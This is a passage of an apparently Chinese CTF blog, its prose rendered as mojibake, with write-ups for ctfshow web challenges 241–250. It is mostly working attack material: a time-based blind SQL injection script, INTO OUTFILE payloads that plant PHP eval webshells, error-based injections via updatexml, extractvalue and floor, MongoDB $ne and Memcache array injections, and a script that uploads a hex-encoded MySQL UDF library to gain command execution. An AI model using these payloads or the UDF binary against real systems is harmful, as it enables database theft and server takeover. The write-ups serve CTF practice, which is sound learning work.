class="comment"># payload = f&quot;ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#è¡¨å banlist,ctfshow_user,flag </span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#åˆ—å id,flag,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ctfshow&#123;00a7ac5a-fbac-4e61-b847-ba84f4699af9&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;ascii(substr((select group_concat(flag)from flag),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;if((<span class="subst">&#123;payload&#125;</span>),sleep(0.05),1)#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>sqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¤‡ä»½è¡¨</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨è¿™3ä¸ªè¯­å¥ï¼Œä½¿æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ç»“å°¾éƒ½æ·»åŠ ä¸Šè‡ªå®šä¹‰çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lines terminated by</span><br><span class="line">lines starting by</span><br><span class="line">fields terminated by</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.php&#x27; lines terminated by &#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;#</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>/dump/1.php</code>æ‰§è¡Œ<code>1=system(&quot;cat /flag.here&quot;);</code>å³å¯</p><h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>è¿‡æ»¤äº†<code>php</code>ï¼Œå¯ä»¥å…ˆä¸Šä¼ <code>.user.ini</code>ï¼Œç„¶åä¸Šä¼ å›¾ç‰‡ğŸå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=.user.ini&#x27; lines starting by &#x27;auto_append_file=&quot;1.jpg&quot;;&#x27;#</span><br></pre></td></tr></table></figure><p>ä¼ ğŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.jpg&#x27; lines starting by &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>/dump/index.php</code>å¹¶æ‰§è¡Œ<code>1=system(&quot;cat /flag.here&quot;);</code></p><h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><p>sqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¤‡ä»½è¡¨</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>updatexml</code>æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_flag,ctfshow_us</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flag,info</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># é•¿åº¦æœ‰é™åˆ¶ï¼Œæ³¨æ„åˆ†å¼€å–</span><br><span class="line"># ctfshow&#123;2295d52e-d13a-40c6-9361</span><br><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select group_concat(flag) from ctfshow_flag),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line">#-cdf390ded690&#125;</span><br><span class="line">/api/?id=1&#x27;||updatexml(1,concat(0x7e,(select right(group_concat(flag),14) from ctfshow_flag),0x7e),1)%23&amp;page=1&amp;limit=10</span><br><span class="line"># æ‹¼æ¥ä¸€ä¸‹å³å¯ ctfshow&#123;2295d52e-d13a-40c6-9361-cdf390ded690&#125;</span><br></pre></td></tr></table></figure><h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><p>è¿‡æ»¤äº†<code>updatexml</code>ï¼Œä½¿ç”¨<code>extractvalue</code>æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select database())))%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å banlist,ctfshow_flagsa,ctfshow_</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å id,flag1,info</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;)))%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># é•¿åº¦æœ‰é™åˆ¶ï¼Œæ³¨æ„åˆ†å¼€å–</span><br><span class="line"># ctfshow&#123;3c98930a-4ff1-4074-bd56</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select group_concat(flag1) from ctfshow_flagsa)))%23&amp;page=1&amp;limit=10</span><br><span class="line"># -98413a509601&#125;</span><br><span class="line">/api/?id=1&#x27;||extractvalue(0x0a,concat(0x0a,(select right(group_concat(flag1),14) from ctfshow_flagsa)))%23&amp;page=1&amp;limit=10</span><br><span class="line"># æ‹¼æ¥ä¸€ä¸‹å³å¯ ctfshow&#123;3c98930a-4ff1-4074-bd56-98413a509601&#125;</span><br></pre></td></tr></table></figure><h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šåˆè¿‡æ»¤äº†<code>extractvalue</code>ï¼Œä½¿ç”¨<code>floor</code>æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å ctfshow_flags</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å flag2</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;2aac7541-6f66-4780-8a44-e8cfa45e1842&#125;</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šåˆè¿‡æ»¤äº†<code>floor</code>ï¼Œä½¿ç”¨å…¶ä»–æ•°å­¦å‡½æ•°</p><blockquote><p>round ceil floor</p></blockquote><p>æ¢æˆ<code>ceil</code>å³å¯ï¼Œæ³¨æ„è¿™ä¸€æ¬¡åˆ—åæ¯”è¾ƒç‰¹æ®Šï¼Œè¦ç”¨åå¼•å·åŒ…è£¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ•°æ®åº“ ctfshow_web</span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># è¡¨å ctfshow_flagsa</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># åˆ—å flag?</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27; limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># ctfshow&#123;f2cfa4cb-9474-422b-9869-1254c8381897&#125;</span><br><span class="line">/api/?id=</span><br><span class="line">1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select `flag?` from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h2 id="web248"><a href="#web248" class="headerlink" title="*web248"></a>*web248</h2><p>ä½¿ç”¨<code>å›½å…‰</code>å¸ˆå‚…çš„<a href="https://www.sqlsec.com/tools/udf.html">å°å·¥å…·</a>å’Œ<code>yu22x</code>å¸ˆå‚…çš„<a href="https://blog.csdn.net/miuzzx/article/details/125220318">è„šæœ¬</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://7f4bb2eb-823a-4218-9b38-670163bf025e.challenge.ctf.show/api/&quot;</span></span><br><span class="line">udf=<span class="string">&quot;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000&quot;</span></span><br><span class="line">udfs=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(udf),<span class="number">5000</span>):</span><br><span class="line">    udfs.append(udf[i:i+<span class="number">5000</span>])</span><br><span class="line"><span class="comment">#å†™å…¥å¤šä¸ªæ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> udfs:</span><br><span class="line">    url1=url+<span class="string">f&quot;?id=1&#x27;;SELECT &#x27;<span class="subst">&#123;i&#125;</span>&#x27; into dumpfile &#x27;/tmp/&quot;</span>+<span class="built_in">str</span>(udfs.index(i))+<span class="string">&quot;.txt&#x27;%23&quot;</span></span><br><span class="line">    requests.get(url1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆå¹¶æ–‡ä»¶ç”Ÿæˆsoæ–‡ä»¶</span></span><br><span class="line">url2=url+<span class="string">&quot;?id=1&#x27;;SELECT unhex(concat(load_file(&#x27;/tmp/0.txt&#x27;),load_file(&#x27;/tmp/1.txt&#x27;),load_file(&#x27;/tmp/2.txt&#x27;),load_file(&#x27;/tmp/3.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/hack.so&#x27;%23&quot;</span></span><br><span class="line">requests.get(url2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶æ‰§è¡Œæ¶æ„å‘½ä»¤</span></span><br><span class="line">requests.get(url+<span class="string">&quot;?id=1&#x27;;create function sys_eval returns string soname &#x27;hack.so&#x27;%23&quot;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&quot;?id=1&#x27;;select sys_eval(&#x27;cat /f*&#x27;)%23&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>sqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ— </span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$memcache</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><code>Memcache</code>ç¼“å­˜æ•°æ®åº“ï¼Œä¼ å…¥æ•°ç»„å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id[]=flag&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>sqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ— è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mongodb</code>æ³¨å…¥ï¼Œä½¿ç”¨æ°¸çœŸå¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é…ä¸Šæ­£åˆ™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 